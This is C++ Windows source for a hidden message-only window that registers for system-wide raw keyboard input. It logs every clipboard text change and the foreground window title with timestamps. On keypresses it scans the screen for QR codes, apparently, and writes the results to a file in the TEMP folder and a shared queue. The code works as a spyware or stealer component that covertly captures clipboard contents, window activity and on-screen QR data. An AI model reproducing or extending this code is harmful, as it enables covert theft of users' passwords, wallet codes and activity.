#define _CRT_SECURE_NO_WARNINGS
#include "WinMsgHandler.h"

#include "QRGrabber.h"
#include <iostream>
#include <fstream>
#include <cstdlib>

//Roll out of trying to integrate MFC and simplify this
WinMsgHandler::WinMsgHandler(std::shared_ptr<SharedQueue> queue) : _queue(queue)
{
	WNDCLASS wc{ 0 };
	wc.lpfnWndProc = this->baseHandle;
	wc.hInstance = hInst;
	wc.lpszClassName = L"Form1";

	// Multimonitor DPI awarness needed for good multiscreen capture
	SetProcessDpiAwarenessContext(DPI_AWARENESS_CONTEXT_PER_MONITOR_AWARE_V2);

	RegisterClassW(&wc);
	wHandle = CreateWindowW(wc.lpszClassName, NULL, 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, hInst, this);

}

WinMsgHandler::~WinMsgHandler()
{
	if (wHandle)
		DestroyWindow(wHandle);
}

LRESULT WinMsgHandler::baseHandle(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	if (WM_NCCREATE == message)
	{
		SetWindowLongPtr(hWnd, GWLP_USERDATA, (LONG_PTR)((CREATESTRUCT*)lParam)->lpCreateParams);
		return TRUE;
	}
	return ((WinMsgHandler*)GetWindowLongPtr(hWnd, GWLP_USERDATA))->classHandleMsg(hWnd, message, wParam, lParam);
}

LRESULT WinMsgHandler::classHandleMsg(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	UINT dwSize = 0;
	switch (message) {

	case WM_CREATE: {
		locale = GetKeyboardLayout(0);
		RAWINPUTDEVICE rid{ 0 };
		rid.dwFlags = RIDEV_INPUTSINK;	// ignore legacy messages, hotkeys and receive system wide keystrokes	
		rid.usUsagePage = 1;											// raw keyboard data only
		rid.usUsage = 6;
		rid.hwndTarget = hWnd;
		RegisterRawInputDevices(&rid, 1, sizeof(rid));
		caplock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
		break;
	}// end case WM_CREATE

	case WM_DESTROY: {
		RAWINPUTDEVICE rid{ 0 };
		rid.dwFlags = RIDEV_REMOVE;	// ignore legacy messages, hotkeys and receive system wide keystrokes	
		rid.usUsagePage = 1;											// raw keyboard data only
		rid.usUsage = 6;
		rid.hwndTarget = hWnd;
		RegisterRawInputDevices(&rid, 1, sizeof(rid));
		PostQuitMessage(0);
		break;
	}// end case WM_DESTROY

	case WM_INPUT: {
		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize, sizeof(RAWINPUTHEADER)) == -1) {
			PostQuitMessage(0);
			break;
		}

		LPBYTE lpb = new BYTE[dwSize];
		if (lpb == NULL) {
			PostQuitMessage(0);
			break;
		}

		if (GetRawInputData((HRAWINPUT)lParam, RID_INPUT, lpb, &dwSize, sizeof(RAWINPUTHEADER)) != dwSize) {
			delete[] lpb;
			PostQuitMessage(0);
			break;
		}

		PRAWINPUT raw = (PRAWINPUT)lpb;
		UINT Event;

		Event = raw->data.keyboard.Message;
		USHORT legacyVkey = raw->data.keyboard.VKey;
		USHORT ScanKey = raw->data.keyboard.MakeCode;
		//UINT keyChar = MapVirtualKey(raw->data.keyboard.VKey, MAPVK_VK_TO_CHAR);
		delete[] lpb;	// free this now


		switch (Event) {

		case WM_KEYDOWN: {			
				pushKey(ScanKey, legacyVkey);
				break;
		}// end WM_KEYDOWN

		default:
			break;
		}//end switch
		break;
	}// end case WM_INPUT
	case WM_CLIPBOARDUPDATE: {
		HandleClipboard();
		break;
	}
	default:
		return DefWindowProc(hWnd, message, wParam, lParam);
	}// end switch
	return 0;
}

void WinMsgHandler::checkFocus(UINT keyChar)
{
	WCHAR window_title[256] = L"";
	WCHAR wt[300] = L"";
	SYSTEMTIME curr_time;
	GetLocalTime(&curr_time);

	auto hActiveWindow = GetForegroundWindow();
	GetWindowTextW(hActiveWindow, window_title, 256);

	//Insert reference to the current window
	if ((hActiveWindow != hPrevWind)) {

		swprintf(wt, 300, L"\r\n%hu-%hu-%hu %hu:%hu [ %s ]\r\n", curr_time.wYear, curr_time.wMonth,
			curr_time.wDay, curr_time.wHour, curr_time.wMinute, window_title);

		_queue->Push(std::wstring(wt));
		hPrevWind = hActiveWindow;
	}
}

LRESULT WinMsgHandler::HandleClipboard()
{
	if (IsClipboardFormatAvailable(CF_UNICODETEXT)) //System should convert between different text types automatically
	{
		if (!OpenClipboard(wHandle))
			return 0;
		auto hglb = GetClipboardData(CF_UNICODETEXT);
		if (hglb != nullptr)
		{
			auto str = (wchar_t*)GlobalLock(hglb);
			if (str)
			{
				checkFocus(0);
				_queue->Push(std::wstring(L"\r\n------[COPY START]----\r\n"));
				_queue->Push(std::wstring(str));
				_queue->Push(std::wstring(L"\r\n------[COPY END]----\r\n"));
			}
			GlobalUnlock(hglb);
		}
		CloseClipboard();
	}

	return 0;
}

static std::wstring utf8_decode(const std::string& str)
{
	if (str.empty()) return std::wstring();
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}

void WinMsgHandler::pushKey(USHORT scanCode, USHORT vkey) {
	time_t now = time(NULL);

	if ((now - lastScanTime) > MIN_TIME_QR_REST) {
		lastScanTime = now;
		auto res = ExtractFromScreen();
		for (const auto& r : res) {
			if(seen.find(r)==seen.end()){
				// Append to file
				const char* tempFolder = std::getenv("TEMP");
				if (tempFolder != nullptr) {
					std::ofstream fileStream(std::string(tempFolder) + "\\"+TMP_FILE_NAME, std::ios::app);
					if (fileStream.is_open()) {
						fileStream << r << std::endl;
						fileStream.close();
					}
				}

				checkFocus(0);
				_queue->Push(utf8_decode(r));
				_queue->Push(L"\r\n");
				seen.insert(r);
			}
		}
	}
}